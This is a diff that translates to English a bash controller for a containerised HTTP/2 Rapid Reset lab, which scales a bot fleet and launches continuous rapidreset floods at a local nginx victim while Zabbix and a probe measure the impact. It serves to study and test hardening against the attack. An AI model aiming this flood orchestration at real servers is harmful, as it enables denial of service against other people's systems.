@@ -1,37 +1,37 @@
 #!/usr/bin/env bash
 # =============================================================================
-# control.sh - centralny, interaktywny sterownik labu HTTP/2 Rapid Reset.
+# control.sh - central, interactive controller for the HTTP/2 Rapid Reset lab.
 #
-# Bez GUI, bez batcha "wszystko naraz". Odpalasz raz, dostajesz zywa konsole i
-# RECZNIE manipulujesz: wybierasz wariant serwera, dynamicznie zwiekszasz /
-# zmniejszasz flote botow, wlaczasz/wylaczasz atak - a efekt obserwujesz na
-# zywo (czas odpowiedzi w terminalu z sondy + metryki serwera w Zabbixie).
+# No GUI, no batch "everything at once". You run it once, get a live console and
+# MANUALLY manipulate: choose the server variant, dynamically scale the bot fleet
+# up/down, enable/disable the attack - and observe the effect in real time
+# (response time in the terminal from the probe + server metrics in Zabbix).
 #
-# IZOLACJA RDZENI (naprawia dziwne wykresy "wiecej botow = mniej CPU"):
-#   victim -> rdzenie 0,1   (saturowalne, widac degradacje)
-#   sonda  -> rdzen 2       (pomiar latencji NIE zaglodzony = wiarygodny)
-#   flota  -> rdzenie 3-11  (napor, nie podkrada CPU ofierze ani sondzie)
+# CORE ISOLATION (fixes weird "more bots = less CPU" charts):
+#   victim -> cores 0,1   (saturable, degradation visible)
+#   probe  -> core 2      (latency measurement NOT starved = reliable)
+#   fleet  -> cores 3-11  (pressure, doesn't steal CPU from victim or probe)
 #
-# GRANICA: flota to z gory zbudowane kontenery tego labu (rapidreset/h2load
-# wbudowane w obraz). Sterownik nimi dyryguje - niczego nie wgrywa na zewnatrz.
+# BOUNDARY: the fleet consists of pre-built containers of this lab (rapidreset/h2load
+# built into the image). The controller orchestrates them - it doesn't deploy anything externally.
 #
-# Uzycie:
-#   bash scenarios/control.sh            # tryb interaktywny (menu)
-#   bash scenarios/control.sh <komenda>  # pojedyncza komenda (do skryptow/testow)
+# Usage:
+#   bash scenarios/control.sh            # interactive mode (menu)
+#   bash scenarios/control.sh <command>  # single command (for scripts/tests)
 #
-# Komendy (w menu wpisujesz bez 'control.sh'):
-#   up                      zbuduj+postaw stos (victim+Zabbix+sonda), sprowizjonuj Zabbix
-#   variant <v>             przelacz serwer: old-normal | old-hardened | new-normal | new-hardened
-#   scale <N>               ustaw flote na dokladnie N botow (dynamicznie w gore/dol)
-#   attack                  odpal Rapid Reset na calej flocie (ciagly, do 'stop')
-#   legit                   odpal ruch h2load (kompletne zadania) zamiast ataku
-#   stop                    zatrzymaj ruch floty
-#   status                  wariant, liczba botow, CPU ofiary, ostatni pomiar sondy
-#   probe [N]               pokaz ostatnie N (domyslnie 12) pomiarow latencji sondy
-#   zabbix                  wypisz link do Zabbixa
-#   down                    zdejmij flote (stos zostaje); 'down all' zdejmuje wszystko
-#   help                    ta pomoc
-#   quit                    wyjscie (stos i flota zostaja dzialajace)
+# Commands (in the menu, type without 'control.sh'):
+#   up                      build+deploy the stack (victim+Zabbix+probe), provision Zabbix
+#   variant <v>             switch server: old-normal | old-hardened | new-normal | new-hardened
+#   scale <N>               set fleet to exactly N bots (dynamically up/down)
+#   attack                  launch Rapid Reset on the entire fleet (continuous, until 'stop')
+#   legit                   launch h2load traffic (complete requests) instead of attack
+#   stop                    stop fleet traffic
+#   status                  variant, bot count, victim CPU, last probe measurement
+#   probe [N]               show last N (default 12) latency probe measurements
+#   zabbix                  print Zabbix link
+#   down                    take down the fleet (stack stays); 'down all' takes down everything
+#   help                    this help
+#   quit                    exit (stack and fleet keep running)
 # =============================================================================
 set -u
 export MSYS_NO_PATHCONV=1 2>/dev/null || true
@@ -65,7 +65,7 @@ state_set() {  # key value
   fi
 }
 
-variant_env() {  # echo "NGINX_OLD VICTIM_MODE" dla nazwy wariantu
+variant_env() {  # echo "NGINX_OLD VICTIM_MODE" for the variant name
   case "$1" in
     old-normal)   echo "1.25.1-alpine normal"   ;;
     old-hardened) echo "1.25.1-alpine hardened" ;;
@@ -79,7 +79,6 @@ wait_victim() {
   local i=0
   while [ $i -lt 40 ]; do
     docker run --rm --network "$LABNET" curlimages/curl:8.8.0 -sk --max-time 2 https://victim/ -o /dev/null 2>/dev/null && return 0
-    # fallback: przez istniejacy kontener probe, jesli jest
     docker exec lab-probe sh -c 'vegeta --version >/dev/null 2>&1' 2>/dev/null
     i=$((i+1)); sleep 1
   done
@@ -93,7 +92,7 @@ present_idx()  { fleet_names | sed -n 's/^lab-fbot-\([0-9]*\)$/\1/p' | sort -n; 
 
 ensure_fleet_image() {
   docker image inspect "$FLEET_IMAGE" >/dev/null 2>&1 && return 0
-  echo "[*] Buduje obraz floty ($FLEET_IMAGE) z ./bot ..."
+  echo "[*] Building fleet image ($FLEET_IMAGE) from ./bot ..."
   docker build -q -t "$FLEET_IMAGE" ./bot >/dev/null
 }
 
@@ -104,15 +103,14 @@ create_bot() {
     "$FLEET_IMAGE" >/dev/null
 }
 
-# Zatrzymanie ruchu: ubij wszystko poza PID1(docker-init), sleep(keepalive) i soba.
 _KILL='for d in /proc/[0-9]*; do p=${d#/proc/}; [ "$p" = "1" ] && continue; [ "$p" = "$$" ] && continue; c=$(cat "$d/comm" 2>/dev/null); [ "$c" = "sleep" ] && continue; [ "$c" = "docker-init" ] && continue; kill -9 "$p" 2>/dev/null; done; exit 0'
 
 cmd_scale() {
   local n="${1:-}"
-  case "$n" in ''|*[!0-9]*) echo "uzycie: scale <liczba>"; return 1 ;; esac
+  case "$n" in ''|*[!0-9]*) echo "usage: scale <number>"; return 1 ;; esac
   ensure_fleet_image
   local present; present="$(present_idx)"
-  echo "[*] Skaluje flote do $n botow (cpuset $FLEET_CPUSET, $FLEET_CPUS CPU/bot) ..."
+  echo "[*] Scaling fleet to $n bots (cpuset $FLEET_CPUSET, $FLEET_CPUS CPU/bot) ..."
   local i
   for i in $(seq 1 "$n"); do
     echo "$present" | grep -qx "$i" || create_bot "$i"
@@ -121,8 +119,7 @@ cmd_scale() {
     [ "$i" -gt "$n" ] && docker rm -f "lab-fbot-$i" >/dev/null 2>&1
   done
   local mode; mode="$(state_get attack_mode)"
-  echo -e "[*] Flota: $(fleet_count) botow.$([ -n "$mode" ] && echo " Ruch '$mode' trwa - nowe boty dozbrajam..." )"
-  # jesli atak trwa, dozbroj wszystkie (idempotentnie)
+  echo -e "[*] Fleet: $(fleet_count) bots.$([ -n "$mode" ] && echo " Traffic '$mode' active - arming new bots..." )"
   [ -n "$mode" ] && cmd_fire "$mode"
   return 0
 }
@@ -130,7 +127,7 @@ cmd_scale() {
 cmd_fire() {  # $1 = attack|legit
   local mode="$1"
   local names; names="$(fleet_names)"
-  [ -z "$names" ] && { echo "[!] Brak botow - najpierw 'scale <N>'"; return 1; }
+  [ -z "$names" ] && { echo "[!] No bots - run 'scale <N>' first"; return 1; }
   local single
   if [ "$mode" = "attack" ]; then
     single='rapidreset -url https://victim:443 -requests 20000 -concurrency 200 -quiet >/dev/null 2>&1'
@@ -140,83 +137,83 @@ cmd_fire() {  # $1 = attack|legit
   local loop="while true; do $single; done"
   local cid
   for cid in $names; do
-    docker exec "$cid" sh -c "$_KILL" >/dev/null 2>&1   # najpierw czysto
+    docker exec "$cid" sh -c "$_KILL" >/dev/null 2>&1
     docker exec -d "$cid" sh -c "$loop"
   done
   state_set attack_mode "$mode"
-  echo -e "${C_R}[*] Ruch '$mode' odpalony na $(echo "$names" | grep -c .) botach (ciagly).${C_0} Zatrzymasz przez 'stop'."
+  echo -e "${C_R}[*] Traffic '$mode' launched on $(echo "$names" | grep -c .) bots (continuous).${C_0} Stop with 'stop'."
 }
 
 cmd_stop() {
   local names; names="$(fleet_names)"
-  [ -z "$names" ] && { echo "[!] Brak botow."; return 0; }
+  [ -z "$names" ] && { echo "[!] No bots."; return 0; }
   local cid
   for cid in $names; do docker exec "$cid" sh -c "$_KILL" >/dev/null 2>&1; done
   state_set attack_mode ""
-  echo -e "${C_G}[*] Ruch zatrzymany na wszystkich botach.${C_0}"
+  echo -e "${C_G}[*] Traffic stopped on all bots.${C_0}"
 }
 
 cmd_variant() {
   local v="${1:-}"
-  local env; env="$(variant_env "$v")" || { echo "nieznany wariant: $v (old-normal|old-hardened|new-normal|new-hardened)"; return 1; }
+  local env; env="$(variant_env "$v")" || { echo "unknown variant: $v (old-normal|old-hardened|new-normal|new-hardened)"; return 1; }
   local ver mode; ver="${env% *}"; mode="${env#* }"
-  echo "[*] Przelaczam victim na '$v' (nginx $ver, tryb $mode) - przebudowa..."
+  echo "[*] Switching victim to '$v' (nginx $ver, mode $mode) - rebuilding..."
   NGINX_OLD="$ver" VICTIM_MODE="$mode" VIC_CPUS=2 dc up -d --build --force-recreate victim >/dev/null 2>&1
   state_set variant "$v"
-  echo "[*] victim przebudowany. Czekam na HTTP/2..."
-  wait_victim && echo -e "${C_G}[*] victim '$v' gotowy.${C_0}" || echo -e "${C_Y}[!] victim nie odpowiedzial w czasie - sprawdz 'docker logs lab-victim'.${C_0}"
+  echo "[*] victim rebuilt. Waiting for HTTP/2..."
+  wait_victim && echo -e "${C_G}[*] victim '$v' ready.${C_0}" || echo -e "${C_Y}[!] victim did not respond in time - check 'docker logs lab-victim'.${C_0}"
 }
 
 cmd_up() {
   ensure_fleet_image
   local v; v="$(state_get variant)"; [ -z "$v" ] && v="old-normal"
   local env; env="$(variant_env "$v")"; local ver mode; ver="${env% *}"; mode="${env#* }"
-  echo "[*] Stawiam stos: victim ($v) + Zabbix + sonda. Pierwszy raz = build, chwile potrwa..."
+  echo "[*] Deploying stack: victim ($v) + Zabbix + probe. First time = build, may take a moment..."
   NGINX_OLD="$ver" VICTIM_MODE="$mode" VIC_CPUS=2 dc up -d --build victim zabbix-db zabbix-server zabbix-web probe
   state_set variant "$v"
-  echo "[*] Czekam na victim..."
-  wait_victim || echo -e "${C_Y}[!] victim wolno wstaje - kontynuuje.${C_0}"
-  echo "[*] Provisioning Zabbix (host victim + szablony)..."
+  echo "[*] Waiting for victim..."
+  wait_victim || echo -e "${C_Y}[!] victim is slow to start - continuing.${C_0}"
+  echo "[*] Provisioning Zabbix (host victim + templates)..."
   dc run --rm zabbix-provision 2>&1 | tail -3
-  echo -e "${C_G}[*] Gotowe.${C_0} Zabbix: $ZABBIX_URL (Admin/zabbix). Sonda w tle (docker logs -f lab-probe)."
+  echo -e "${C_G}[*] Done.${C_0} Zabbix: $ZABBIX_URL (Admin/zabbix). Probe in background (docker logs -f lab-probe)."
 }
 
 cmd_status() {
   local v bots mode cpu last
-  v="$(state_get variant)"; [ -z "$v" ] && v="(nieustawiony)"
+  v="$(state_get variant)"; [ -z "$v" ] && v="(not set)"
   bots="$(fleet_count)"
-  mode="$(state_get attack_mode)"; [ -z "$mode" ] && mode="bezczynny"
+  mode="$(state_get attack_mode)"; [ -z "$mode" ] && mode="idle"
   cpu="$(docker stats --no-stream --format '{{.CPUPerc}}' lab-victim 2>/dev/null || echo '?')"
   echo "-------------------------------------------"
-  echo -e " wariant serwera : ${C_B}$v${C_0}"
-  echo -e " boty we flocie  : ${C_B}$bots${C_0}"
-  echo -e " ruch floty      : $([ "$mode" = bezczynny ] && echo "${C_G}$mode${C_0}" || echo "${C_R}$mode${C_0}")"
-  echo -e " CPU victim      : ${C_B}$cpu${C_0}  (budzet: 2 rdzenie = max 200%)"
+  echo -e " server variant  : ${C_B}$v${C_0}"
+  echo -e " bots in fleet   : ${C_B}$bots${C_0}"
+  echo -e " fleet traffic   : $([ "$mode" = idle ] && echo "${C_G}$mode${C_0}" || echo "${C_R}$mode${C_0}")"
+  echo -e " CPU victim      : ${C_B}$cpu${C_0}  (budget: 2 cores = max 200%)"
   if [ -f "$PROBE_CSV" ]; then
     last="$(tail -1 "$PROBE_CSV")"
-    echo " sonda (ostatni) : $(echo "$last" | awk -F, '{printf "p95=%sms success=%s%% rps=%s @ %s", $4,$7,$8,$2}')"
+    echo " probe (latest)  : $(echo "$last" | awk -F, '{printf "p95=%sms success=%s%% rps=%s @ %s", $4,$7,$8,$2}')"
   else
-    echo " sonda           : (brak danych - czy 'up' postawil probe?)"
+    echo " probe           : (no data - did 'up' deploy the probe?)"
   fi
   echo "-------------------------------------------"
 }
 
 cmd_probe() {
   local n="${1:-12}"
-  [ -f "$PROBE_CSV" ] || { echo "brak $PROBE_CSV (postaw stos: 'up')"; return 1; }
-  echo "czas     p50     p95      p99      success  rps   (ostatnie $n okien)"
+  [ -f "$PROBE_CSV" ] || { echo "missing $PROBE_CSV (deploy the stack: 'up')"; return 1; }
+  echo "time     p50     p95      p99      success  rps   (last $n windows)"
   tail -n "$n" "$PROBE_CSV" | awk -F, 'NR>=1{printf "%-8s %-7s %-8s %-8s %-7s%% %-6s\n",$2,$3,$4,$5,$7,$8}'
 }
 
 cmd_down() {
-  echo "[*] Zdejmuje flote..."
+  echo "[*] Taking down fleet..."
   docker ps -aq --filter label=lab-fbot=1 | xargs -r docker rm -f >/dev/null 2>&1
   state_set attack_mode ""
   if [ "${1:-}" = "all" ]; then
-    echo "[*] Zdejmuje caly stos (victim/Zabbix/sonda)..."
+    echo "[*] Taking down entire stack (victim/Zabbix/probe)..."
     dc down >/dev/null 2>&1
   fi
-  echo "[*] Gotowe."
+  echo "[*] Done."
 }
 
 dispatch() {
@@ -233,25 +230,25 @@ dispatch() {
     down)    cmd_down "${2:-}" ;;
     help|'') sed -n '32,50p' "$0" | sed 's/^#\s\?//' ;;
     quit|exit) return 9 ;;
-    *) echo "nieznana komenda: $1 (wpisz 'help')" ;;
+    *) echo "unknown command: $1 (type 'help')" ;;
   esac
 }
 
-# --- tryb jednokomendowy (do testow/skryptow) ---
+# --- single-command mode (for tests/scripts) ---
 if [ $# -gt 0 ]; then
   dispatch "$@"
   exit $?
 fi
 
-# --- tryb interaktywny (menu) ---
-echo -e "${C_B}=== Lab HTTP/2 Rapid Reset - sterownik ===${C_0}"
-echo "Wpisz 'up' aby postawic stos, potem 'variant', 'scale', 'attack'/'legit', 'stop', 'status'."
-echo "Obserwuj: czas odpowiedzi w 'status'/'probe' + metryki serwera w Zabbixie ($ZABBIX_URL)."
-echo "'help' = pelna lista, 'quit' = wyjscie (stos zostaje)."
+# --- interactive mode (menu) ---
+echo -e "${C_B}=== Lab HTTP/2 Rapid Reset - controller ===${C_0}"
+echo "Type 'up' to deploy the stack, then 'variant', 'scale', 'attack'/'legit', 'stop', 'status'."
+echo "Observe: response time in 'status'/'probe' + server metrics in Zabbix ($ZABBIX_URL)."
+echo "'help' = full list, 'quit' = exit (stack keeps running)."
 cmd_status 2>/dev/null
 while true; do
   printf "${C_B}lab>${C_0} "
   read -r a b c || break
   dispatch "$a" "$b" "$c"; rc=$?
-  [ "$rc" = "9" ] && { echo "pa (stos i flota dzialaja dalej; 'down all' aby zdjac)"; break; }
+  [ "$rc" = "9" ] && { echo "bye (stack and fleet keep running; 'down all' to take down)"; break; }
 done
